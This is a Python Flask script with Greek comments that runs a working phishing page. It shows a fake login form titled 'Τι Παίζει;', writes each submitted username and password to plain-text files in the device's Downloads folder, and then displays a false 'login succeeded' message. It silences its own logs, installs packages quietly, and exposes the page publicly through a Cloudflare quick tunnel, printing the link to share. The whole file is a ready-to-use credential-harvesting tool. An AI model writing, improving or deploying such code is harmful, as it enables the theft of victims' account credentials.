import os
import sys
import subprocess
import re
import threading
import time
import logging
from flask import Flask, render_template_string, request
from datetime import datetime
from werkzeug.utils import secure_filename

# Αυτόματη εγκατάσταση πακέτων που λείπουν αθόρυβα
def install(pkg):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας το pip αθόρυβα."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Ρύθμιση της εφαρμογής Flask
app = Flask(__name__)

# Πλήρης απόκρυψη των αρχείων καταγραφής (logs) των Flask και Werkzeug
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)  # Ουσιαστικά σίγαση
app.logger.setLevel(logging.ERROR + 10)

# Επίσης, σίγαση των μηνυμάτων εκκίνησης του Flask με προσωρινή ανακατεύθυνση της εξόδου
class DummyFile(object):
    """Ένα ψευδο-αντικείμενο αρχείου για την απόκρυψη της εξόδου."""
    def write(self, x): pass
    def flush(self): pass

# Φάκελος αποθήκευσης δεδομένων
# Τα διαπιστευτήρια θα αποθηκευτούν στον κατάλογο Downloads/TiPaizei
BASE_FOLDER = os.path.expanduser("~/storage/downloads/TiPaizei")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    """Προβάλλει την κύρια σελίδα σύνδεσης."""
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Τι Παίζει;</title>
        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Πράσινο & Μαύρο Θέμα */
                --background-color: #121212;
                --container-bg: #1a1a1a;
                --primary-green: #00ff7f; /* Spring Green */
                --text-color: #e0e0e0;
                --border-color: #2c2c2c;
                --input-bg: #252525;
                --button-hover: #00e673;
                --link-color: var(--primary-green);
                --shadow-color: rgba(0, 255, 127, 0.1);
            }

            body {
                font-family: 'Montserrat', sans-serif;
                background-color: var(--background-color);
                color: var(--text-color);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
            }

            .container {
                background-color: var(--container-bg);
                border: 1px solid var(--border-color);
                border-top: 3px solid var(--primary-green);
                width: 100%;
                max-width: 380px;
                padding: 40px;
                text-align: center;
                box-sizing: border-box;
                border-radius: 10px;
                box-shadow: 0 5px 25px var(--shadow-color);
            }

            .title {
                font-size: 2.5em;
                font-weight: 700;
                color: var(--primary-green);
                margin: 0 0 30px 0;
                text-shadow: 0 0 10px rgba(0, 255, 127, 0.3);
            }

            .input-field input {
                width: 100%;
                padding: 14px 12px;
                margin-bottom: 12px;
                border: 1px solid var(--border-color);
                border-radius: 5px;
                background-color: var(--input-bg);
                font-size: 16px;
                box-sizing: border-box;
                color: var(--text-color);
                transition: border-color 0.3s, box-shadow 0.3s;
            }

            .input-field input::placeholder {
                color: #666;
            }

            .input-field input:focus {
                border-color: var(--primary-green);
                box-shadow: 0 0 8px rgba(0, 255, 127, 0.2);
                outline: none;
            }

            .login-button {
                width: 100%;
                padding: 14px;
                border: none;
                border-radius: 5px;
                background-color: var(--primary-green);
                color: #121212;
                font-weight: 700;
                font-size: 16px;
                cursor: pointer;
                margin-top: 20px;
                transition: background-color 0.2s ease, transform 0.2s ease;
            }

            .login-button:hover {
                background-color: var(--button-hover);
                transform: translateY(-2px);
            }
            
            .forgot-password {
                display: block;
                margin-top: 25px;
                color: var(--link-color);
                font-size: 14px;
                text-decoration: none;
            }

            .forgot-password:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="title">Τι Παίζει;</h1>
            <form action="/login" method="post">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Όνομα Χρήστη" required>
                </div>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Κωδικός Πρόσβασης" required>
                </div>
                <button type="submit" class="login-button">Σύνδεση</button>
            </form>
            <a href="#" class="forgot-password">Ξεχάσατε τον κωδικό;</a>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    """Διαχειρίζεται την υποβολή της φόρμας και αποθηκεύει τα διαπιστευτήρια."""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    if not username or not password:
        return "Το όνομα χρήστη και ο κωδικός πρόσβασης είναι απαραίτητα!", 400

    # Απολύμανση του ονόματος χρήστη για τη δημιουργία ενός ασφαλούς ονόματος αρχείου
    safe_username = secure_filename(username)
    timestamp_file = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp_file}.txt")

    with open(user_file_path, 'w', encoding='utf-8') as file:
        file.write(f"Όνομα Χρήστη: {username}\n")
        file.write(f"Κωδικός Πρόσβασης: {password}\n")
        file.write(f"Χρονική Σφραγίδα: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>Σύνδεση σε εξέλιξη...</title>
      <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
            --background-color: #121212;
            --text-color: #e0e0e0;
            --primary-green: #00ff7f;
        }
        body {
          font-family: 'Montserrat', sans-serif;
          margin: 0; 
          padding: 20px;
          display: flex; 
          justify-content: center;
          min-height: 100vh;
          align-items: center;
          background-color: var(--background-color);
          color: var(--text-color);
        }
        .container {
          text-align: center;
        }
        h2 {
          color: var(--primary-green);
          font-size: 2em;
        }
        p {
          font-size: 1.2em;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Η Σύνδεση Πέτυχε!</h2>
        <p>Σύνδεση στον διακομιστή... παρακαλώ περιμένετε.</p>
      </div>
    </body>
    </html>
    '''
    )

def run_cloudflared_tunnel(local_url):
    """Ξεκινά ένα tunnel του Cloudflare και εκτυπώνει τη δημόσια διεύθυνση URL."""
    # Εντολή για την έναρξη του tunnel
    cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", local_url]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8')
    tunnel_url = None
    for line in iter(process.stdout.readline, ''):
        # Αναζήτηση της δημόσιας διεύθυνσης URL στην έξοδο
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"✅ Τι Παίζει; Δημόσιος Σύνδεσμος: {tunnel_url}")
            sys.stdout.flush()
            # Μην σταματήσετε εδώ, αφήστε το να συνεχίσει να εκτυπώνει logs αν υπάρχουν
    return process

if __name__ == '__main__':
    # Σίγαση των μηνυμάτων εκκίνησης του Flask με προσωρινή ανακατεύθυνση των stdout/stderr
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    # Εκτέλεση της εφαρμογής Flask σε ξεχωριστό thread
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Επαναφορά των stdout/stderr μετά την έναρξη του διακομιστή
    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση διακομιστή και tunnel Cloudflare...")

    # Έναρξη και διαχείριση της διαδικασίας του tunnel του Cloudflare
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        # Διατήρηση του κύριου thread ενεργού, περιμένοντας την έξοδο της διαδικασίας του tunnel
        cloudflared_process.wait()
    except KeyboardInterrupt:
        print("\nΤερματισμός λειτουργίας...")
        cloudflared_process.terminate()
        sys.exit(0)